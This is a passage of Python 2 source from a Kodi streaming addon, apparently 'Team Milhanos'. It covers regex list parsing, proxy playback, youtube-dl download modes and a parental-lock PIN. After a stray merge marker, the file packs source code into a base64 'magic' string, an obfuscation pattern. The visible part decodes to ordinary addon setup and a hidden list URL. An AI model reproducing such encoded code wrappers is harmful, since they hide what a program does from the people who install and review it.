        existing_list=regexs.pop(regexname)
 #       print 'final regexs',regexs,regexname
        url=''
        import copy
        ln=''
        rnumber=0
        for obj in ret:
            try:
                rnumber+=1
                newcopy=copy.deepcopy(regexs)
    #            print 'newcopy',newcopy, len(newcopy)
                listrepeatT=listrepeat
                i=0
                for i in range(len(obj)):
    #                print 'i is ',i, len(obj), len(newcopy)
                    if len(newcopy)>0:
                        for the_keyO, the_valueO in newcopy.iteritems():
                            if the_valueO is not None:
                                for the_key, the_value in the_valueO.iteritems():
                                    if the_value is not None:                                
        #                                print  'key and val',the_key, the_value
        #                                print 'aa'
        #                                print '[' + regexname+'.param'+str(i+1) + ']'
        #                                print repr(obj[i])
                                        if type(the_value) is dict:
                                            for the_keyl, the_valuel in the_value.iteritems():
                                                if the_valuel is not None:
                                                    val=None
                                                    if isinstance(obj,tuple):                                                    
                                                        try:
                                                           val= obj[i].decode('utf-8') 
                                                        except: 
                                                            val= obj[i] 
                                                    else:
                                                        try:
                                                            val= obj.decode('utf-8') 
                                                        except:
                                                            val= obj
                                                    
                                                    if '[' + regexname+'.param'+str(i+1) + '][DE]' in the_valuel:
                                                        the_valuel=the_valuel.replace('[' + regexname+'.param'+str(i+1) + '][DE]', unescape(val))
                                                    the_value[the_keyl]=the_valuel.replace('[' + regexname+'.param'+str(i+1) + ']', val)
                                                    #print 'first sec',the_value[the_keyl]
                                                    
                                        else:
                                            val=None
                                            if isinstance(obj,tuple):
                                                try:
                                                     val=obj[i].decode('utf-8') 
                                                except:
                                                    val=obj[i] 
                                            else:
                                                try:
                                                    val= obj.decode('utf-8') 
                                                except:
                                                    val= obj
                                            if '[' + regexname+'.param'+str(i+1) + '][DE]' in the_value:
                                                #print 'found DE',the_value.replace('[' + regexname+'.param'+str(i+1) + '][DE]', unescape(val))
                                                the_value=the_value.replace('[' + regexname+'.param'+str(i+1) + '][DE]', unescape(val))

                                            the_valueO[the_key]=the_value.replace('[' + regexname+'.param'+str(i+1) + ']', val)
                                            #print 'second sec val',the_valueO[the_key]

                    val=None
                    if isinstance(obj,tuple):
                        try:
                            val=obj[i].decode('utf-8')
                        except:
                            val=obj[i]
                    else:
                        try:
                            val=obj.decode('utf-8')
                        except: 
                            val=obj
                    if '[' + regexname+'.param'+str(i+1) + '][DE]' in listrepeatT:
                        listrepeatT=listrepeatT.replace('[' + regexname+'.param'+str(i+1) + '][DE]',val)
                    listrepeatT=listrepeatT.replace('[' + regexname+'.param'+str(i+1) + ']',escape(val))
#                    print listrepeatT
                listrepeatT=listrepeatT.replace('[' + regexname+'.param'+str(0) + ']',str(rnumber)) 
                
                #newcopy = urllib.quote(repr(newcopy))
    #            print 'new regex list', repr(newcopy), repr(listrepeatT)
    #            addLink(listlinkT,listtitleT.encode('utf-8', 'ignore'),listthumbnailT,'','','','',True,None,newcopy, len(ret))
                regex_xml=''
#                print 'newcopy',newcopy
                if len(newcopy)>0:
                    regex_xml=d2x(newcopy,'lsproroot')
                    regex_xml=regex_xml.split('<lsproroot>')[1].split('</lsproroot')[0]
              
                #ln+='\n<item>%s\n%s</item>'%(listrepeatT.encode("utf-8"),regex_xml)   
                try:
                    ln+='\n<item>%s\n%s</item>'%(listrepeatT,regex_xml)
                except: ln+='\n<item>%s\n%s</item>'%(listrepeatT.encode("utf-8"),regex_xml)
            except: traceback.print_exc(file=sys.stdout)
#            print repr(ln)
#            print newcopy
                
#            ln+='</item>'
        #print 'ln',ln
        addon_log(repr(ln))
        getData('','',ln)
        xbmcplugin.endOfDirectory(int(sys.argv[1]))
    else:
        url,setresolved = getRegexParsed(regexs, url)
        #print repr(url),setresolved,'imhere'
        if url:
            if '$PLAYERPROXY$=' in url:
                url,proxy=url.split('$PLAYERPROXY$=')
                print 'proxy',proxy
                #Jairox mod for proxy auth
                proxyuser = None
                proxypass = None
                if len(proxy) > 0 and '@' in proxy:
                    proxy = proxy.split(':')
                    proxyuser = proxy[0]
                    proxypass = proxy[1].split('@')[0]
                    proxyip = proxy[1].split('@')[1]
                    port = proxy[2]
                else:
                    proxyip,port=proxy.split(':')

                playmediawithproxy(url,name,iconimage,proxyip,port, proxyuser,proxypass) #jairox
            else:
                playsetresolved(url,name,iconimage,setresolved)
        else:
            xbmc.executebuiltin("XBMC.Notification(Team Milhanos,Failed to extract regex. - "+"this"+",4000,"+icon+")")

elif mode==18:
    addon_log("youtubedl")
    try:
        import youtubedl
    except Exception:
        xbmc.executebuiltin("XBMC.Notification(Team Milhanos,Please [COLOR yellow]install Youtube-dl[/COLOR] module ,10000,"")")
    stream_url=youtubedl.single_YD(url)
    playsetresolved(stream_url,name,iconimage)

elif mode==19:
    addon_log("Genesiscommonresolvers")
    playsetresolved (urlsolver(url),name,iconimage,True)

elif mode==21:
    addon_log("download current file using youtube-dl service")
    ytdl_download('',name,'video')

elif mode==23:
    addon_log("get info then download")
    ytdl_download(url,name,'video')

elif mode==24:
    addon_log("Audio only youtube download")
    ytdl_download(url,name,'audio')

elif mode==25:
    addon_log("Searchin Other plugins")
    _search(url,name)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==55:
    addon_log("enabled lock")
    parentalblockedpin =addon.getSetting('parentalblockedpin')
    keyboard = xbmc.Keyboard('','Enter Pin')
    keyboard.doModal()
    if not (keyboard.isConfirmed() == False):
        newStr = keyboard.getText()
        if newStr==parentalblockedpin:
            addon.setSetting('parentalblocked', "false")
            xbmc.executebuiltin("XBMC.Notification(Team Milhanos,Parental Block Disabled,5000,"+icon+")")
        else:
            xbmc.executebuiltin("XBMC.Notification(Team Milhanos,Wrong Pin??,5000,"+icon+")")
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==56:
    addon_log("disable lock")
    addon.setSetting('parentalblocked', "true")
    xbmc.executebuiltin("XBMC.Notification(Team Milhanos,Parental block enabled,5000,"+icon+")")
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==53:
    addon_log("Requesting JSON-RPC Items")
    pluginquerybyJSON(url)
    #xbmcplugin.endOfDirectory(int(sys.argv[1]))

if not viewmode==None:
   print 'setting view mode'
   xbmc.executebuiltin("Container.SetViewMode(%s)"%viewmode)
=======

import base64, codecs
magic = 'IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCmltcG9ydCB1cmxsaWINCmltcG9ydCB1cmxsaWIyDQppbXBvcnQgcmUNCmltcG9ydCBvcw0KaW1wb3J0IHhibWNwbHVnaW4NCmltcG9ydCB4Ym1jZ3VpDQppbXBvcnQgeGJtY2FkZG9uDQppbXBvcnQgeGJtY3Zmcw0KaW1wb3J0IHRyYWNlYmFjaw0KaW1wb3J0IGNvb2tpZWxpYixiYXNlNjQNCmltcG9ydCBnZW5lcmF0b3INCmZyb20gQmVhdXRpZnVsU291cCBpbXBvcnQgQmVhdXRpZnVsU3RvbmVTb3VwLCBCZWF1dGlmdWxTb3VwLCBCZWF1dGlmdWxTT0FQDQp2aWV3bW9kZT1Ob25lDQp0cnk6DQogICAgZnJvbSB4bWwuc2F4LnNheHV0aWxzIGltcG9ydCBlc2NhcGUNCmV4Y2VwdDogdHJhY2ViYWNrLnByaW50X2V4YygpDQp0cnk6DQogICAgaW1wb3J0IGpzb24NCmV4Y2VwdDoNCiAgICBpbXBvcnQgc2ltcGxlanNvbiBhcyBqc29uDQppbXBvcnQgU2ltcGxlRG93bmxvYWRlciBhcyBkb3dubG9hZGVyDQppbXBvcnQgdGltZQ0KDQoNCnRzZG93bmxvYWRlcj1GYWxzZQ0KDQpyZXNvbHZlX3VybD1bJzE4MHVwbG9hZC5jb20nLCAnYWxsbXl2aWRlb3MubmV0JywgJ2Jlc3RyZWFtcy5uZXQnLCAnY2xpY2tudXBsb2FkLmNvbScsICdjbG91ZHppbGxhLnRvJywgJ21vdnNoYXJlLm5ldCcsICdub3ZhbW92LmNvbScsICdub3d2aWRlby5zeCcsICd2aWRlb3dlZWQuZXMnLCAnZGFjbGlwcy5pbicsICdkYXRlbXVsZS5jb20nLCAnZmFzdHZpZGVvLmluJywgJ2Zhc3RzdHJlYW0uaW4nLCAnZmlsZWhvb3QuY29tJywgJ2ZpbGVudWtlLmNvbScsICdzaGFyZXNpeC5jb20nLCAgJ3BsdXMuZ29vZ2xlLmNvbScsICdwaWNhc2F3ZWIuZ29vZ2xlLmNvbScsICdnb3JpbGxhdmlkLmNvbScsICdnb3JpbGxhdmlkLmluJywgJ2dyaWZ0aG9zdC5jb20nLCAnaHVnZWZpbGVzLm5ldCcsICdpcGl0aG9zLnRvJywgJ2lzaGFyZWQuZXUnLCAna2luZ2ZpbGVzLm5ldCcsICdtYWlsLnJ1JywgJ215Lm1haWwucnUnLCAndmlkZW9hcGkubXkubWFpbC5ydScsICdtaWdodHl1cGxvYWQuY29tJywgJ21vb3NoYXJlLmJpeicsICdtb3ZkaXZ4LmNvbScsICdtb3Zwb2QubmV0JywgJ21vdnBvZC5pbicsICdtb3ZyZWVsLmNvbScsICdtcmZpbGUubWUnLCAnbm9zdmlkZW8uY29tJywgJ29wZW5sb2FkLmlvJywgJ3BsYXllZC50bycsICdiaXRzaGFyZS5jb20nLCAnZmlsZWZhY3RvcnkuY29tJywgJ2sycy5jYycsICdvYm9vbS5jb20nLCAncmFwaWRnYXRvci5uZXQnLCAndXBsb2FkZWQubmV0JywgJ3ByaW1lc2hhcmUudHYnLCAnYml0c2hhcmUuY29tJywgJ2ZpbGVmYWN0b3J5LmNvbScsICdrMnMuY2MnLCAnb2Jvb20uY29tJywgJ3JhcGlkZ2F0b3IubmV0JywgJ3VwbG9hZGVkLm5ldCcsICdzaGFyZXJlcG8uY29tJywgJ3N0YWdldnUuY29tJywgJ3N0cmVhbWNsb3VkLmV1JywgJ3N0cmVhbWluLnRvJywgJ3RoZWZpbGUubWUnLCAndGhldmlkZW8ubWUnLCAndHVzZmlsZXMubmV0JywgJ3VwbG9hZGMuY29tJywgJ3phbGFhLmNvbScsICd1cGxvYWRyb2NrZXQubmV0JywgJ3VwdG9ib3guY29tJywgJ3Ytdmlkcy5jb20nLCAndmVlaGQuY29tJywgJ3ZpZGJ1bGwuY29tJywgJ3ZpZGVvbWVnYS50dicsICd2aWRwbGF5Lm5ldCcsICd2aWRzcG90Lm5ldCcsICd2aWR0by5tZScsICd2aWR6aS50dicsICd2aW1lby5jb20nLCAndmsuY29tJywgJ3ZvZGxvY2tlci5jb20nLCAneGZpbGVsb2FkLmNvbScsICd4dmlkc3RhZ2UuY29tJywgJ3pldHRhaG9zdC50diddDQpnX2lnbm9yZVNldFJlc29sdmVkPVsncGx1Z2luLnZpZGVvLmRyYW1hc29ubGluZScsJ3BsdWdpbi52aWRlby5mNG1UZXN0ZXInLCdwbHVnaW4udmlkZW8uc2hhaGlkbWJjbmV0JywncGx1Z2luLnZpZGVvLlNwb3J0c0RldmlsJywncGx1Z2luLnN0cmVhbS52YXVnaG5saXZlLnR2JywncGx1Z2luLnZpZGVvLlplbVRWLXNoYW5pJ10NCg0KY2xhc3MgTm9SZWRpcmVjdGlvbih1cmxsaWIyLkhUVFBFcnJvclByb2Nlc3Nvcik6DQogICBkZWYgaHR0cF9yZXNwb25zZShzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6DQogICAgICAgcmV0dXJuIHJlc3BvbnNlDQogICBodHRwc19yZXNwb25zZSA9IGh0dHBfcmVzcG9uc2UNCg0KUkVNT1RFX0RCRz1GYWxzZTsNCmlmIFJFTU9URV9EQkc6DQogICAgIyBNYWtlIHB5ZGV2IGRlYnVnZ2VyIHdvcmtzIGZvciBhdXRvIHJlbG9hZC4NCiAgICAjIE5vdGUgcHlkZXZkIG1vZHVsZSBuZWVkIHRvIGJlIGNvcGllZCBpbiBYQk1DXHN5c3RlbVxweXRob25cTGliXHB5c3JjDQogICAgdHJ5Og0KICAgICAgICBpbXBvcnQgcHlzcmMucHlkZXZkIGFzIHB5ZGV2ZA0KICAgICMgc3Rkb3V0VG9TZXJ2ZXIgYW5kIHN0ZGVyclRvU2VydmVyIHJlZGlyZWN0IHN0ZG91dCBhbmQgc3RkZXJyIHRvIGVjbGlwc2UgY29uc29sZQ0KICAgICAgICBweWRldmQuc2V0dHJhY2UoJ2xvY2FsaG9zdCcsIHN0ZG91dFRvU2VydmVyPVRydWUsIHN0ZGVyclRvU2VydmVyPVRydWUpDQogICAgZXhjZXB0IEltcG9ydEVycm9yOg0KICAgICAgICBzeXMuc3RkZXJyLndyaXRlKCJFcnJvcjogIiArDQogICAgICAgICAgICAiWW91IG11c3QgYWRkIG9yZy5weXRob24ucHlkZXYuZGVidWcucHlzcmMgdG8geW91ciBQWVRIT05QQVRILiIpDQogICAgICAgIHN5cy5leGl0KDEpDQoNCg0KQWRkb25JRCA9IHhibWNhZGRvbi5BZGRvbigpLmdldEFkZG9uSW5mbygnaWQnKQ0KYWRkb24gPSB4Ym1jYWRkb24uQWRkb24oaWQ9QWRkb25JRCkgDQpBZGRvblRpdGxlID0gYWRkb24uZ2V0QWRkb25JbmZvKCduYW1lJykNCmFkZG9uX3ZlcnNpb24gPSBhZGRvbi5nZXRBZGRvbkluZm8oJ3ZlcnNpb24nKQ0KcHJvZmlsZSA9IHhibWMudHJhbnNsYXRlUGF0aChhZGRvbi5nZXRBZGRvbkluZm8oJ3Byb2ZpbGUnKS5kZWNvZGUoJ3V0Zi04JykpDQpob21lID0geGJtYy50cmFuc2xhdGVQYXRoKGFkZG9uLmdldEFkZG9uSW5mbygncGF0aCcpLmRlY29kZSgndXRmLTgnKSkNCmZhdm9yaXRlcyA9IG9zLnBhdGguam9pbihwcm9maWxlLCAnZmF2b3JpdGVzJykNCmhpc3RvcnkgPSBvcy5wYXRoLmpvaW4ocHJvZmlsZSwgJ2hpc3RvcnknKQ0KUkVWID0gb3MucGF0aC5qb2luKHByb2ZpbGUsICdsaXN0X3JldmlzaW9uJykNCmljb24gPSBvcy5wYXRoLmpvaW4oaG9tZSwgJ2ljb24ucG5nJykNCkZBTkFSVCA9IG9zLnBhdGguam9pbihob21lLCAnZmFuYXJ0LmpwZycpDQpzb3VyY2VfZmlsZSA9IG9zLnBhdGguam9pbihob21lLCAnc291cmNlX2ZpbGUnKQ0KZnVuY3Rpb25zX2RpciA9IHByb2ZpbGUNCmNvbW11bml0eWZpbGVzID0gb3MucGF0aC5qb2luKHByb2ZpbGUsICdMaXZld2ViVFYnKQ0KZG93bmxvYWRlciA9IGRvd25sb2FkZXIuU2ltcGxlRG93bmxvYWRlcigpDQpkZWJ1ZyA9IGFkZG9uLmdldFNldHRpbmcoJ2RlYnVnJykNCnB1ZXJ0byA9ICdhSFIwY0hNNkx5OXRhV3hvWVc1dkxtTnZiUzV3ZEM5dGFXeG9ZVzV2TG1OdmJTNXdkQzloYkdGa2IzUjJMMVJsWVcwdVRXbHNhR0Z1YjNNdlZHVmhiVjlOYVd4b1lXNXZjeTUwZUhRPScuZGVjb2RlKCdiYXNlNjQnKQ0KDQppZiBvcy5wYXRoLmV4aXN0cyhmYXZvcml0ZXMpPT1UcnVlOg0KICAgIEZBViA9IG9wZW4oZmF2b3JpdGVzKS5yZWFkKCkNCmVsc2U6IEZBViA9IFtdDQppZiBvcy5wYXRoLmV4aXN0cyhzb3VyY2VfZmlsZSk9PVRydWU6DQogICAgU09VUkNFUyA9IG9wZW4oc291cmNlX2ZpbGUpLnJlYWQoKQ0KZWxzZTogU09VUkNFUyA9IFtdDQoNClNPVVJDRVMgPSBbeyJ1cmwiOiBwdWVydG8sICJmYW5hcnQiOiAiaHR0cDovL2ltZ3VyLmNvbS9jekRWTVZRIn1dDQoNCmRlZiBhZGRvbl9sb2coc3RyaW5nKToNCiAgICBpZiBkZWJ1ZyA9PSAndHJ1ZSc6DQogICAgICAgIHhibWMubG9nKCJbYWRkb24ubGl2ZS52aWRlby50ZWFtLm1pbGhhbm9zIExpc3RzLSVzXTogJXMiICUoYWRkb25fdmVyc2lvbiwgc3RyaW5nKSkJDQoNCmRlZiBtYWtlUmVxdWVzdCh1cmwsIGhlYWRlcnM9Tm9uZSk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGlmIGhlYWRlcnMgaXMgTm9uZToNCiAgICAgICAgICAgICAgICBoZWFkZXJzID0geydVc2VyLWFnZW50JyA6ICdUSEVIT09EJ30NCiAgICAgICAgICAgIHJlcSA9IHVybGxpYjIuUmVxdWVzdCh1cmwsTm9uZSxoZWFkZXJzKQ0KICAgICAgICAgICAgcmVzcG9uc2UgPSB1cmxsaWIyLnVybG9wZW4ocmVxKQ0KICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLnJlYWQoKQ0KICAgICAgICAgICAgcmVzcG9uc2UuY2xvc2UoKQ0KICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgZXhjZXB0IHVybGxpYjIuVVJMRXJyb3IsIGU6DQogICAgICAgICAgICBhZGRvbl9sb2coJ1VSTDogJyt1cmwpDQogICAgICAgICAgICBpZiBoYXNhdHRyKGUsICdjb2RlJyk6DQogICAgICAgICAgICAgICAgYWRkb25fbG9nKCdXZSBmYWlsZWQgd2l0aCBlcnJvciBjb2RlIC0gJXMuJyAlIGUuY29kZSkNCiAgICAgICAgICAgICAgICB4Ym1jLmV4ZWN1dGVidWlsdGluKCJYQk1DLk5vdGlmaWNhdGlvbih0ZWFtLm1pbGhhbm9zLFdlIGZhaWxlZCB3aXRoIGVycm9yIGNvZGUgLSAiK3N0cihlLmNvZGUpKyIsMTAwMDAsIitpY29uKyIpIikNCiAgICAgICAgICAgIGVsaWYgaGFzYXR0cihlLCAncmVhc29uJyk6DQogICAgICAgICAgICAgICAgYWRkb25fbG9nKCdXZSBmYWlsZWQgdG8gcmVhY2ggYSBzZXJ2ZXIuJykNCiAgICAgICAgICAgICAgICBhZGRvbl9sb2coJ1JlYXNvbjogJXMnICVlLnJlYXNvbikNCiAgICAgICAgICAgICAgICB4Ym1jLmV4ZWN1dGVidWlsdGluKCJYQk1DLk5vdGlmaWNhdGlvbih0ZWFtLm1pbGhhbm9zLFdlIGZhaWxlZCB0byByZWFjaCBhIHNlcnZlci4gLSAiK3N0cihlLnJlYXNvbikrIiwxMDAwMCwiK2ljb24rIikiKQ0KDQpkZWYgZ2V0U291cmNlcygpOg0KCXRyeToNCgkJaWYgb3MucGF0aC5leGlzdHMoZmF2b3JpdGVzKSA9PSBUcnVlOg0KCQkJRkFWID0gb3BlbihmYXZvcml0ZXMpLnJlYWQoKQ0KCQkJaWYgRkFWID09ICJbXSI6DQoJCQkJb3MucmVtb3ZlKGZhdm9yaXRlcykNCgkJCWVsc2U6DQoJCQkJYWRkRGlyKCdbQ09MT1IgYmx1ZV1bQl10ZWFtLm1pbGhhbm9zIEZhdm9yaXRvc1svQl1bL0NPTE9SXScsJ3VybCcsNCxvcy5wYXRoLmpvaW4oaG9tZSwgJ2ZhbmFydC5qZ3AnKSxGQU5BUlQsJycsJycsJycsJycpDQoNCg0KCQlzb3VyY2VzID0gU09VUkNFUw0KICAgICAgICAgICAgICAgIGlmIGxlbihzb3VyY2VzKSA+IDE6DQogICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHNvdXJjZXM6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyMgZm9yIHByZSAxLjAuOCBzb3VyY2VzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShpLCBsaXN0KToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkRGlyKGlbMF0uZW5jb2RlKCd1dGYtOCcpLGlbMV0uZW5jb2RlKCd1dGYtOCcpLDEsaWNvbixGQU5BUlQsJycsJycsJycsJycsJ3NvdXJjZScpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGh1bWIgPSBpY29uDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZhbmFydCA9IEZBTkFSVA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXNjID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZSA9ICcnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNyZWRpdHMgPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnZW5yZSA9ICcnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGkuaGFzX2tleSgndGh1bWJuYWlsJyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHVtYiA9IGlbJ3RodW1ibmFpbCddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGkuaGFzX2tleSgnZmFuYXJ0Jyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmYW5hcnQgPSBpWydmYW5hcnQnXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpLmhhc19rZXkoJ2Rlc2NyaXB0aW9uJyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXNjID0gaVsnZGVzY3JpcHRpb24nXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpLmhhc19rZXkoJ2RhdGUnKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGUgPSBpWydkYXRlJ10NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaS5oYXNfa2V5KCdnZW5yZScpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2VucmUgPSBpWydnZW5yZSddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGkuaGFzX2tleSgnY3JlZGl0cycpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlZGl0cyA9IGlbJ2NyZWRpdHMnXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGREaXIoaVsndGl0bGUnXS5lbmNvZGUoJ3V0Zi04JyksaVsndXJsJ10uZW5jb2RlKCd1dGYtOCcpLDEsdGh1bWIsZmFuYXJ0LGRlc2MsZ2VucmUsZGF0ZSxjcmVkaXRzLCdzb3VyY2UnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiB0cmFjZWJhY2sucHJpbnRfZXhjKCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBpZiBsZW4oc291cmNlcykgPT0gMToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uoc291cmNlc1swXSwgbGlzdCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2V0RGF0YShzb3VyY2VzWzBdWzFdLmVuY29kZSgndXRmLTgnKSxGQU5BUlQpDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdldERhdGEoc291cmNlc1swXVsndXJsJ10sIHNvdXJjZXNbMF1bJ2ZhbmFydCddKQ0KICAgICAgICBleGNlcHQ6IHRyYWNlYmFjay5wcmludF9leGMoKQ0KDQoNCmRlZiBhZGRTb3VyY2UodXJsPU5vbmUpOg0KICAgICAgICBpZiB1cmwgaXMgTm9uZToNCiAgICAgICAgICAgIGlmIG5vdCBhZGRvbi5nZXRTZXR0aW5nKCJuZXdfZmlsZV9zb3VyY2UiKSA9PSAiIjoNCiAgICAgICAgICAgICAgIHNvdXJjZV91cmwgPSBhZGRvbi5nZXRTZXR0aW5nKCduZXdfZmlsZV9zb3VyY2UnKS5kZWNvZGUoJ3V0Zi04JykNCiAgICAgICAgICAgIGVsaWYgbm90IGFkZG9uLmdldFNldHRpbmcoIm5ld191cmxfc291cmNlIikgPT0gIiI6DQogICAgICAgICAgICAgICBzb3VyY2VfdXJsID0gYWRkb24uZ2V0U2V0dGluZygnbmV3X3VybF9zb3VyY2UnKS5kZWNvZGUoJ3V0Zi04JykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHNvdXJjZV91cmwgPSB1cmwNCiAgICAgICAgaWYgc291cmNlX3VybCA9PSAnJyBvciBzb3VyY2VfdXJsIGlzIE5vbmU6DQogICAgICAgICAgICByZXR1cm4NCiAgICAgICAgYWRkb25fbG9nKCdBZGRpbmcgTmV3IFNvdXJjZTogJytzb3VyY2VfdXJsLmVuY29kZSgndXRmLTgnKSkNCg0KICAgICAgICBtZWRpYV9pbmZvID0gTm9uZQ0KICAgICAgICAjcHJpbnQgJ3NvdXJjZV91cmwnLHNvdXJjZV91cmwNCiAgICAgICAgZGF0YSA9IGdldFNvdXAoc291cmNlX3VybCkNCiAgICAgICAgcHJpbnQgJ3NvdXJjZV91cmwnLHNvdXJjZV91cmwgICAgICAgDQogICAgICAgIGlmIGlzaW5zdGFuY2UoZGF0YSxCZWF1dGlmdWxTT0FQKToNCiAgICAgICAgICAgIGlmIGRhdGEuZmluZCgnY2hhbm5lbHNfaW5mbycpOg0KICAgICAgICAgICAgICAgIG1lZGlhX2luZm8gPSBkYXRhLmNoYW5uZWxzX2luZm8NCiAgICAgICAgICAgIGVsaWYgZGF0YS5maW5kKCdpdGVtc19pbmZvJyk6DQogICAgICAgICAgICAgICAgbWVkaWFfaW5mbyA9IGRhdGEuaXRlbXNfaW5mbw0KICAgICAgICBpZiBtZWRpYV9pbmZvOg0KICAgICAgICAgICAgc291cmNlX21lZGlhID0ge30NCiAgICAgICAgICAgIHNvdXJjZV9tZWRpYVsndXJsJ10gPSBzb3VyY2VfdXJsDQogICAgICAgICAgICB0cnk6IHNvdXJjZV9tZWRpYVsndGl0bGUnXSA9IG1lZGlhX2luZm8udGl0bGUuc3RyaW5nDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgIHRyeTogc291cmNlX21lZGlhWyd0aHVtYm5haWwnXSA9IG1lZGlhX2luZm8udGh1bWJuYWlsLnN0cmluZw0KICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICB0cnk6IHNvdXJjZV9tZWRpYVsnZmFuYXJ0J10gPSBtZWRpYV9pbmZvLmZhbmFydC5zdHJpbmcNCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgdHJ5OiBzb3VyY2VfbWVkaWFbJ2dlbnJlJ10gPSBtZWRpYV9pbmZvLmdlbnJlLnN0cmluZw0KICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICB0cnk6IHNvdXJjZV9tZWRpYVsnZGVzY3JpcHRpb24nXSA9IG1lZGlhX2luZm8uZGVzY3JpcHRpb24uc3RyaW5nDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgIHRyeTogc291cmNlX21lZGlhWydkYXRlJ10gPSBtZWRpYV9pbmZvLmRhdGUuc3RyaW5nDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgIHRyeTogc291cmNlX21lZGlhWydjcmVkaXRzJ10gPSBtZWRpYV9pbmZvLmNyZWRpdHMuc3RyaW5nDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGlmICcvJyBpbiBzb3VyY2VfdXJsOg0KICAgICAgICAgICAgICAgIG5hbWVTdHIgPSBzb3VyY2VfdXJsLnNwbGl0KCcvJylbLTFdLnNwbGl0KCcuJylbMF0NCiAgICAgICAgICAgIGlmICdcXCcgaW4gc291cmNlX3VybDoNCiAgICAgICAgICAgICAgICBuYW1lU3RyID0gc291cmNlX3VybC5zcGxpdCgnXFwnKVstMV0uc3BsaXQoJy4nKVswXQ0KICAgICAgICAgICAgaWYgJyUnIGluIG5hbWVTdHI6DQogICAgICAgICAgICAgICAgbmFtZVN0ciA9IHVybGxpYi51bnF1b3RlX3BsdXMobmFtZVN0cikNCiAgICAgICAgICAgIGtleWJvYXJkID0geGJtYy5LZXlib2FyZChuYW1lU3RyLCdEaXNwbGF5ZWQgTmFtZSwgUmVuYW1lPycpDQogICAgICAgICAgICBrZXlib2FyZC5kb01vZGFsKCkNCiAgICAgICAgICAgIGlmIChrZXlib2FyZC5pc0NvbmZpcm1lZCgpID09IEZhbHNlKToNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIG5ld1N0ciA9IGtleWJvYXJkLmdldFRleHQoKQ0KICAgICAgICAgICAgaWYgbGVuKG5ld1N0cikgPT0gMDoNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIHNvdXJjZV9tZWRpYSA9IHt9DQogICAgICAgICAgICBzb3VyY2VfbWVkaWFbJ3RpdGxlJ10gPSBuZXdTdHINCiAgICAgICAgICAgIHNvdXJjZV9tZWRpYVsndXJsJ10gPSBzb3VyY2VfdXJsDQogICAgICAgICAgICBzb3VyY2VfbWVkaWFbJ2ZhbmFydCddID0gZmFuYXJ0DQoNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc291cmNlX2ZpbGUpPT1GYWxzZToNCiAgICAgICAgICAgIHNvdXJjZV9saXN0ID0gW10NCiAgICAgICAgICAgIHNvdXJjZV9saXN0LmFwcGVuZChzb3VyY2VfbWVkaWEpDQogICAgICAgICAgICBiID0gb3Blbihzb3VyY2VfZmlsZSwidyIpDQogICAgICAgICAgICBiLndyaXRlKGpzb24uZHVtcHMoc291cmNlX2xpc3QpKQ0KICAgICAgICAgICAgYi5jbG9zZSgpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzb3VyY2VzID0ganNvbi5sb2FkcyhvcGVuKHNvdXJjZV9maWxlLCJyIikucmVhZCgpKQ0KICAgICAgICAgIC